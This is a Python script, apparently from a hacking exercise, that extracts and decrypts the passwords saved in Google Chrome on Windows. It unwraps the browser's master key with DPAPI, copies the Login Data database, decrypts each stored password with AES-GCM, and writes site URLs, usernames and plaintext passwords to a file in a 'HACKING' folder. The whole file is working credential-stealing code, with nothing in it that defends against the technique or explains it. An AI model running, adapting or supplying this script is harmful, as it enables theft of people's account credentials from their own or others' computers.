import base64
import os
import json
import win32crypt
from Crypto.Cipher import AES
import sqlite3
import shutil

def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_password(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except Exception as e:
        print(f"Error decrypting password: {e}")
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except Exception as e:
            print(f"Error using win32crypt: {e}")
            return ""

def main():
    key = get_encryption_key()
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data")
    filename = "ChromeData.db"
    shutil.copyfile(db_path, filename)
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    cursor.execute("SELECT origin_url, action_url, username_value, password_value FROM logins ORDER BY date_created")

    hacking_dir = os.path.join(os.environ["USERPROFILE"], "soydaltoPY", "HACKING")
    if not os.path.exists(hacking_dir):
        os.makedirs(hacking_dir)
        print(f"Created directory: {hacking_dir}")

    filePath = os.path.join(hacking_dir, "archivo.txt")
    print(f"Saving file to: {filePath}")

    with open(filePath, "w") as myFile:
        for row in cursor.fetchall():
            origin_url = row[0]
            action_url = row[1]
            username_value = row[2]
            password_value = decrypt_password(row[3], key)

            if username_value or password_value:
                print(f"Writing data for URL: {origin_url}")
                myFile.write(f"Origin URL: {origin_url}\n")
                myFile.write(f"Action URL: {action_url}\n")
                myFile.write(f"Username: {username_value}\n")
                myFile.write(f"Password: {password_value}\n")
            else:
                continue
            myFile.write("-" * 50 + "\n")
        
        cursor.close()
        db.close()
        try:
            os.remove(filename)
        except Exception as e:
            print(f"Failed to delete database file: {e}")

if __name__ == "__main__":
    main()
